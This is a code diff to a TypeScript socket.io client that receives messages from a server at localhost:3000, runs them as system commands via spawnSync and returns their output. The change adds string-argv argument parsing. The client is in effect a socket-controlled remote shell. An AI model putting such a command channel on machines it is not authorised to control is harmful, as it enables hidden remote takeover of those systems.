@@ -1,10 +1,15 @@
 import {io, Socket} from "socket.io-client";
-import {spawn, spawnSync} from "child_process";
+import {spawnSync} from "child_process";
 import * as fs from "fs";
 // @ts-ignore
 import ss from "socket.io-stream"
+import stringArgv from "string-argv"
 
 const socket = io("http://localhost:3000")
+
+const replaceAll = (message: string, search: string, replace: string)=> {
+    return message.replace(new RegExp(search, 'g'), replace)
+}
 
 class Client {
     private readonly socket: Socket;
@@ -70,7 +75,9 @@ class Client {
                 this.sendMessage("downloaded file.")
 
             default:
-                const command = spawnSync(messagesArray[0], messagesArray.slice(1));
+                const args = stringArgv(messagesArray.slice(1).join(" "))
+
+                const command = spawnSync(messagesArray[0], args);
 
                 const output = (command?.stderr?.toString() + command?.stdout?.toString()) ?? ""
                 return output
